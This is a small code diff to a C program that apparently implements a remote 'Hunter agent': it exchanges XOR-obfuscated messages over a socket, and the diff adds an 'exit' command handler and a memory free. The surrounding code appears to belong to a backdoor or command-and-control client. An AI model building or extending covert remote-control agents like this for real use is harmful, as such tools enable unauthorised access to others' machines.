@@ -121,9 +121,17 @@ int main(void)
 			{
 				char* xornewline = XOR("\n", key, 1, keylen);
 				write(sock, xornewline, 1);
+				free(xornewline);
 		
 			}
+			else if(str_starts_with(xorbuf, "exit\n") == 0){
 
+				char* disconnect = "[+] Hunter agent: OK\n";
+				char* xordisconnect = XOR(disconnect, key, strlen(disconnect), keylen);
+				write(sock, xordisconnect, strlen(disconnect));
+				free(xordisconnect);
+				return 0;
+			}
 			else
 			{
 				char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
